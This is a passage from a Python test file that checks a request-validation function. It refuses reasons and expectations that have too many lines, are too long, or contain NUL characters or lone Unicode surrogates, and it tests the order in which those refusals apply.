    for breaker in ("\r", "\r\n", "\x0b", "\x0c", "\x1c", "\x85", "\u2028", "\u2029"):
        assert request_refusal("make", breaker.join(["r"] * 20), "what") is (
            RequestRefusal.REASON_TOO_MANY_LINES
        ), repr(breaker)
        assert request_refusal("make", "why", breaker.join(["e"] * 20)) is (
            RequestRefusal.EXPECTS_TOO_MANY_LINES
        ), repr(breaker)
    # The command's own refusal comes first, and the length before the lines.
    assert request_refusal("-x", tall, tall) is RequestRefusal.LEADS_WITH_OPTION
    assert request_refusal("make", "r\n" * 600, "what") is RequestRefusal.REASON_TOO_LONG
    assert str(c.MAX_REASON_LINES) in RequestRefusal.REASON_TOO_MANY_LINES.sentence
    assert str(c.MAX_EXPECTS_LINES) in RequestRefusal.EXPECTS_TOO_MANY_LINES.sentence


@pytest.mark.parametrize(
    ("reason", "expects", "expected"),
    [
        ("a\x00b", "fine", RequestRefusal.REASON_NUL),
        ("a\ud800b", "fine", RequestRefusal.REASON_LONE_SURROGATE),
        ("a\udfff", "fine", RequestRefusal.REASON_LONE_SURROGATE),
        ("fine", "\x00", RequestRefusal.EXPECTS_NUL),
        ("fine", "x\udc00", RequestRefusal.EXPECTS_LONE_SURROGATE),
        # The reason is judged first, and a NUL ahead of a surrogate.
        ("\ud800\x00", "\x00", RequestRefusal.REASON_NUL),
        ("\ud800", "\x00", RequestRefusal.REASON_LONE_SURROGATE),
        # Either side of the surrogate block, and a whole pair, are characters.
        ("\ud7ff \ue000 \U0001f600", "\U0010ffff", None),
    ],
)
def test_a_reason_or_an_expectation_that_cannot_be_encoded_is_refused(
    reason: str, expects: str, expected: RequestRefusal | None
) -> None:
    """
    Neither can be drawn by the binding or written to the record's file, so a
    request holding one would be a row nobody could read or refuse.
    """
    assert request_refusal("make", reason, expects) is expected
    # The command's own refusal still comes first.
    assert request_refusal("", reason, expects) is RequestRefusal.EMPTY
    if expected is None:
        (reason + expects).encode("utf-8")
